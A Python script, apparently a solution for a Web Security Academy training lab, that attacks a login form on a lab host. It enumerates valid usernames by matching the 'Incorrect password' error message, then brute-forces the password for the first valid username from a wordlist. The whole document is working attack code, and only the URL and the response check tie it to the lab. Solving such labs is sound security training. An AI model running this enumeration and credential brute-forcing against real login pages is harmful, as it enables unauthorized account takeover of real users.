import requests
from bs4 import BeautifulSoup

correct_usernames = []
session = requests.Session()
with open("./usernames.txt", "r") as usernames:
    for username in usernames:
        print(username, end="")
        payload = {
            'username': (None, username.strip()),
            'password': (None,"hej")
        }
        r = session.post("https://0ac6008604562a7c87cdcf2500410055.web-security-academy.net/login", payload)
        soup = BeautifulSoup(r.text, features="lxml")
        response_check = soup.find("p", {"class": "is-warning"})
        if(response_check.get_text() == "Incorrect password"):
            correct_usernames.append(username.strip())


print("\nCorrect Username: ", correct_usernames)

correct_passwords = []
with open("./passwords.txt", "r") as passwords:
    for password in passwords:
        print(password, end="")
        payload = {
            'username': (None, correct_usernames[0]),#correct_usernames[0]),
            'password': (None, password.strip())
        }
        r = session.post("https://0ac6008604562a7c87cdcf2500410055.web-security-academy.net/login", payload)
        soup = BeautifulSoup(r.text, features="lxml")
        response_check = soup.find("p", {"class": "is-warning"})
        if not(response_check):
            correct_passwords.append(password.strip())

print("\n Correct passwords", correct_passwords)
